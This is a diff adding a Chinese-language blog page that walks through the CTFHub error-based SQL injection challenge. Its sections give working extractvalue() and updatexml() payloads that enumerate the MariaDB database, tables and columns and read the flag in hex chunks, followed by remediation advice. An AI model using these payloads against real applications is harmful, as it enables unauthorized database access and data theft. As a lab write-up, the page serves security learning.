@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 报错注入 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - 报错注入</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># 报错注入</span>
+            <span class="tag"># extractvalue</span>
+            <span class="tag"># MariaDB</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>报错注入</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>通过 SQL 报错信息逐步读取数据库名、表名和字段值，最终获取 flag。</li>
+        </ul>
+
+        <h2>二、判断注入点</h2>
+        <p>页面提供 <code>id</code> 查询参数，并直接回显服务端执行的 SQL 语句。提交 <code>id=1</code> 时显示：</p>
+        <pre>select * from news where id=1
+查询正确</pre>
+        <p>参数直接拼接在 <code>id=</code> 后，没有单引号包裹，属于整数型注入点。提交单引号可以触发 SQL 语法错误：</p>
+        <pre>select * from news where id=1'
+
+查询错误: You have an error in your SQL syntax; check the manual that
+corresponds to your MariaDB server version for the right syntax to use
+near ''' at line 1</pre>
+        <p>响应同时泄露了数据库类型为 MariaDB，这为使用 <code>extractvalue()</code> 或 <code>updatexml()</code> 构造报错注入提供了条件。</p>
+
+        <h2>三、验证报错注入</h2>
+        <p>在查询后追加 <code>and extractvalue()</code>，并让第二个参数包含以 <code>~</code> 包裹的待读取内容。由于参数不是合法的 XPath 表达式，错误信息会回显拼接后的内容：</p>
+        <pre>id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</pre>
+        <p>页面返回：</p>
+        <pre>XPATH syntax error: '~sqli~'</pre>
+        <p>可以确认当前数据库为 <code>sqli</code>，并且注入结果能够通过 XPATH 错误信息直接回显。等价的 <code>updatexml()</code> payload 也可以得到相同结果：</p>
+        <pre>id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</pre>
+
+        <h2>四、枚举表名</h2>
+        <p>通过 <code>information_schema.tables</code> 查询当前数据库中的表名，并使用 <code>group_concat()</code> 将结果合并为一个字符串：</p>
+        <pre>id=1 and extractvalue(1,concat(0x7e,
+  (select group_concat(table_name)
+   from information_schema.tables
+   where table_schema=database()),0x7e))</pre>
+        <p>服务端返回：</p>
+        <pre>XPATH syntax error: '~flag,news~'</pre>
+        <p>目标表为 <code>flag</code>。</p>
+
+        <h2>五、枚举字段名</h2>
+        <p>查询 <code>flag</code> 表的字段。这里使用十六进制值 <code>0x666c6167</code> 表示字符串 <code>flag</code>，避免额外的引号处理：</p>
+        <pre>id=1 and extractvalue(1,concat(0x7e,
+  (select group_concat(column_name)
+   from information_schema.columns
+   where table_schema=database()
+   and table_name=0x666c6167),0x7e))</pre>
+        <p>页面返回字段名：</p>
+        <pre>XPATH syntax error: '~flag~'</pre>
+
+        <h2>六、分段读取 Flag</h2>
+        <p>直接读取 <code>flag</code> 字段时，错误信息最多只能稳定回显约 32 个字符。为避免内容被截断，先将字段值转换为十六进制，再使用 <code>substr()</code> 分段读取。</p>
+        <p>读取第 1 至 30 个十六进制字符：</p>
+        <pre>id=1 and extractvalue(1,concat(0x7e,
+  substr(hex((select flag from flag limit 1)),1,30),0x7e))</pre>
+        <pre>6374666875627B6666383464376562</pre>
+        <p>读取第 31 至 60 个字符：</p>
+        <pre>id=1 and extractvalue(1,concat(0x7e,
+  substr(hex((select flag from flag limit 1)),31,30),0x7e))</pre>
+        <pre>366438316435303831366433663736</pre>
+        <p>读取第 61 个字符开始的内容：</p>
+        <pre>id=1 and extractvalue(1,concat(0x7e,
+  substr(hex((select flag from flag limit 1)),61,30),0x7e))</pre>
+        <pre>387D</pre>
+        <p>拼接后得到完整的十六进制字符串：</p>
+        <pre>6374666875627B6666383464376562366438316435303831366433663736387D</pre>
+        <p>使用 <code>length()</code> 验证原 flag 长度为 32，转换后的十六进制长度应为 64；解码上述十六进制字符串即可得到 flag。</p>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{ff84d7eb6d81d50816d3f768}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止把用户输入直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的数据类型校验，只允许合法的整数输入。</li>
+            <li>关闭生产环境中的详细数据库错误回显，统一返回通用错误页面。</li>
+            <li>数据库账号遵循最小权限原则，限制对 <code>information_schema</code> 和业务表的访问能力。</li>
+        </ul>
+
+        <h2>九、解题总结</h2>
+        <p>本题的核心是构造 XPATH 错误，让数据库把目标查询结果写入错误信息并回显。<code>extractvalue()</code> 和 <code>updatexml()</code> 都可用于此类注入；当报错信息存在长度限制时，可以先将结果转为十六进制，再通过 <code>substr()</code> 分段提取。实际开发中应使用参数化查询并从生产环境移除详细数据库错误。</p>
+    </div>
+</body>
+</html>
